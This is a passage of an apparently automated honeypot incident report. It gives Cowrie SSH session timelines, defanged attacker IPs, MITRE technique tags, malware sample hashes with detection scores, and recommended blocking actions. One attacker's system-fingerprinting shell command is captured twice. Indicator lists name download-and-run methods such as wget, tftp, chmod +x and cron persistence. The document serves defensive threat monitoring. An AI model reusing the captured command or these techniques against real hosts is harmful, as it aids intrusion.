| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:51:35` | `cowrie.session.connect` |
| `2026-08-04 04:51:35` | `cowrie.client.version` |
| `2026-08-04 04:51:35` | `cowrie.client.kex` |
| `2026-08-04 04:51:36` | `cowrie.login.success` |
| `2026-08-04 04:51:37` | `cowrie.session.params` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.success` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.command.input` |
| `2026-08-04 04:51:37` | `cowrie.log.closed` |
| `2026-08-04 04:51:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f7dd9285200

| Field | Detail |
|---|---|
| **Source IP** | `200.106.49[.]149` |
| **First Seen** | 2026-08-04 04:51 |
| **Last Seen** | 2026-08-04 04:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:51:40` | `cowrie.session.connect` |
| `2026-08-04 04:51:41` | `cowrie.client.version` |
| `2026-08-04 04:51:41` | `cowrie.client.kex` |
| `2026-08-04 04:51:42` | `cowrie.login.success` |
| `2026-08-04 04:51:44` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.106.49[.]149` to AbuseIPDB if not already reported
- [ ] Block `200.106.49[.]149` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df665d7c47d2

| Field | Detail |
|---|---|
| **Source IP** | `41.178.230[.]115` |
| **First Seen** | 2026-08-04 04:51 |
| **Last Seen** | 2026-08-04 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:51:53` | `cowrie.session.connect` |
| `2026-08-04 04:51:54` | `cowrie.client.version` |
| `2026-08-04 04:51:54` | `cowrie.client.kex` |
| `2026-08-04 04:51:55` | `cowrie.login.success` |
| `2026-08-04 04:51:55` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.178.230[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.178.230[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92592436fc16

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-08-04 04:51 |
| **Last Seen** | 2026-08-04 04:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:51:56` | `cowrie.session.connect` |
| `2026-08-04 04:51:57` | `cowrie.client.version` |
| `2026-08-04 04:51:57` | `cowrie.client.kex` |
| `2026-08-04 04:51:59` | `cowrie.login.success` |
| `2026-08-04 04:52:00` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3a174318b20

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-08-04 04:52 |
| **Last Seen** | 2026-08-04 04:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:52:05` | `cowrie.session.connect` |
| `2026-08-04 04:52:06` | `cowrie.client.version` |
| `2026-08-04 04:52:06` | `cowrie.client.kex` |
| `2026-08-04 04:52:07` | `cowrie.login.success` |
| `2026-08-04 04:52:08` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:52:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8af5a3d81b1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:53 |
| **Last Seen** | 2026-08-04 04:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:53:50` | `cowrie.session.connect` |
| `2026-08-04 04:53:50` | `cowrie.client.version` |
| `2026-08-04 04:53:50` | `cowrie.client.kex` |
| `2026-08-04 04:53:52` | `cowrie.login.success` |
| `2026-08-04 04:53:53` | `cowrie.session.params` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.success` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.command.input` |
| `2026-08-04 04:53:53` | `cowrie.log.closed` |
| `2026-08-04 04:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e29473e748dd

| Field | Detail |
|---|---|
| **Source IP** | `60.166.8[.]174` |
| **First Seen** | 2026-08-04 04:54 |
| **Last Seen** | 2026-08-04 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:54:06` | `cowrie.session.connect` |
| `2026-08-04 04:54:07` | `cowrie.client.version` |
| `2026-08-04 04:54:07` | `cowrie.client.kex` |
| `2026-08-04 04:54:09` | `cowrie.login.success` |
| `2026-08-04 04:54:10` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.166.8[.]174` to AbuseIPDB if not already reported
- [ ] Block `60.166.8[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `114.67.232[.]93` | **24** | 2026-08-04 03:45 | 2026-08-04 04:48 | 36m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **10** | 2026-08-04 01:05 | 2026-08-04 04:54 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `194.165.16[.]166` | **9** | 2026-08-04 02:31 | 2026-08-04 04:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **8** | 2026-08-04 01:51 | 2026-08-04 04:37 | 6m | 0 | `T1592` | 🟢 LOW |
| `34.22.185[.]221` | **4** | 2026-08-04 03:47 | 2026-08-04 03:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-04 01:16 | 2026-08-04 01:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-08-04 02:06 | 2026-08-04 02:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]33` | **3** | 2026-08-04 03:32 | 2026-08-04 03:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]115` | **3** | 2026-08-04 03:31 | 2026-08-04 03:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]89` | **3** | 2026-08-04 03:32 | 2026-08-04 03:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-08-04 03:28 | 2026-08-04 03:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `116.1.149[.]196` | **2** | 2026-08-04 03:20 | 2026-08-04 03:23 | 4m | 0 | `T1592` | 🟢 LOW |
| `46.161.50[.]108` | **2** | 2026-08-04 04:33 | 2026-08-04 04:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | **2** | 2026-08-04 03:57 | 2026-08-04 04:15 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.154.43[.]210` | **2** | 2026-08-04 02:47 | 2026-08-04 02:47 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `100.58.116[.]226` | 1 | 2026-08-04 01:22 | 2026-08-04 01:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `115.190.223[.]207` | 1 | 2026-08-04 03:48 | 2026-08-04 03:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.181.11[.]147` | 1 | 2026-08-04 04:11 | 2026-08-04 04:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-08-04 03:51 | 2026-08-04 03:51 | 1s | 0 | `T1592` | 🟢 LOW |
| `118.196.92[.]141` | 1 | 2026-08-04 01:56 | 2026-08-04 01:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.115.66[.]14` | 1 | 2026-08-04 03:08 | 2026-08-04 03:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.133.10[.]66` | 1 | 2026-08-04 01:27 | 2026-08-04 01:27 | 18s | 0 | `T1592` | 🟢 LOW |
| `130.211.103[.]2` | 1 | 2026-08-04 03:46 | 2026-08-04 03:47 | 7s | 0 | `T1592` | 🟢 LOW |
| `143.198.179[.]104` | 1 | 2026-08-04 02:55 | 2026-08-04 02:55 | 12s | 0 | `T1592` | 🟢 LOW |
| `165.154.163[.]10` | 1 | 2026-08-04 01:50 | 2026-08-04 01:50 | 49s | 0 | `T1592` | 🟢 LOW |
| `181.224.223[.]93` | 1 | 2026-08-04 04:09 | 2026-08-04 04:09 | 12s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]60` | 1 | 2026-08-04 03:05 | 2026-08-04 03:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.124.20[.]253` | 1 | 2026-08-04 00:57 | 2026-08-04 00:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]231` | 1 | 2026-08-04 02:10 | 2026-08-04 02:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.26.3[.]149` | 1 | 2026-08-04 03:21 | 2026-08-04 03:21 | 11s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]116` | 1 | 2026-08-04 02:10 | 2026-08-04 02:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]117` | 1 | 2026-08-04 03:05 | 2026-08-04 03:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.90.60[.]176` | 1 | 2026-08-04 03:59 | 2026-08-04 03:59 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-08-04 04:06 | 2026-08-04 04:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-08-04 01:08 | 2026-08-04 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.198.224[.]26` | 1 | 2026-08-04 02:17 | 2026-08-04 02:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.36.123[.]36` | 1 | 2026-08-04 03:48 | 2026-08-04 03:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.152[.]240` | 1 | 2026-08-04 03:43 | 2026-08-04 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]171` | 1 | 2026-08-04 02:26 | 2026-08-04 02:26 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-08-04 02:37 | 2026-08-04 02:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]218` | 1 | 2026-08-04 01:43 | 2026-08-04 01:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]48` | 1 | 2026-08-04 01:33 | 2026-08-04 01:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `76.132.238[.]43` | 1 | 2026-08-04 03:08 | 2026-08-04 03:08 | 6s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]55` | 1 | 2026-08-04 03:22 | 2026-08-04 03:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]184` | 1 | 2026-08-04 00:58 | 2026-08-04 00:58 | 10s | 0 | `T1592` | 🟢 LOW |
| `89.236.205[.]63` | 1 | 2026-08-04 04:39 | 2026-08-04 04:40 | 14s | 0 | `T1592` | 🟢 LOW |
| `92.38.89[.]30` | 1 | 2026-08-04 03:38 | 2026-08-04 03:38 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **33/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.174.145[.]35` | IN | VAIDIK NETSOL OPC PVT LTD | **100** ⚠️ | 50 |
| `63.135.169[.]175` | US | MacStadium, Inc. | **100** ⚠️ | 50 |
| `85.217.149[.]55` | CA | NL MODAT | **100** ⚠️ | 50 |
| `45.198.224[.]26` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `74.208.177[.]56` | US | IONOS Inc. | **100** ⚠️ | 50 |
